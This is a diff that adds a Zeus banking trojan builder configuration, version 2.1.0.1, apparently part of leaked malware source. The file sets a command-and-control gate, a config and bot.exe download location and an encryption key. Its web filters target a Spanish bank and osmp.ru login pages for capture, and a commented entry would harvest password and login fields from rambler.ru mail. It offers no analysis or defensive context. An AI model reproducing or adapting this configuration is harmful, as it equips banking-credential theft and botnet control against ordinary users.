@@ -1,0 +1,37 @@
+;Build time:   9:28:57 24.03.2008 GMT
+;Version:      2.1.0.1
+
+entry "StaticConfig"
+  ;botnet "btn1"
+  timer_config 60 1
+  timer_logs 1 1
+  timer_stats 20 1
+  url_config "http://localhost/sims/config.bin"
+  remove_certs 1
+  disable_tcpserver 0
+  encryption_key "secret key"
+end
+
+entry "DynamicConfig"
+  url_loader "http://localhost/sism/bot.exe"
+  url_server "http://localhost/sims/gate.php"
+  file_webinjects "E:\123\cch\Zs_2.1.0.1\Zeus_2.1.0.1\Zeus_2.1.0.1\Zeus_2.1.0.1\builder\webinjects.txt"
+  entry "AdvancedConfigs"
+    ;"http://advdomain/cfg1.bin"
+  end
+  entry "WebFilters"
+    "!*.microsoft.com/*"
+    "!http://*myspace.com*"
+    "https://www.gruposantander.es/*"
+    "!http://*odnoklassniki.ru/*"
+    "!http://vkontakte.ru/*"
+    "@*/login.osmp.ru/*"
+    "@*/atl.osmp.ru/*"
+  end
+  entry "WebDataFilters"
+    ;"http://mail.rambler.ru/*" "passw;login"
+  end
+  entry "WebFakes"
+    ;"http://www.google.com" "http://www.yahoo.com" "GP" "" ""
+  end
+end
